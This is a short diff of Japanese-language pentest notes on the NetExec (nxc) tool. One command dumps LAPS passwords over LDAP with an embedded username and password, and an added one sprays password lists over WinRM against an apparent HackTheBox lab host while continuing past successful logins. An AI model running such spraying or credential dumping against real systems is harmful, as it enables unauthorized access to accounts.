@@ -12,3 +12,8 @@ crackmapexecがあまり保守されなくなったぽいのでそれの後継�
 ```
 nxc ldap 192.168.142.122 -u fmcsorley -p CrabSharkJellyfish192 -M laps
 ```
+
+2. 認証情報のセットが一致してもパスワードスプレーを続ける
+```
+nxc winrm sauna.egotistical-bank.local -u ./creds/users.txt -p ./creds/pass.txt --continue-on-success
+```
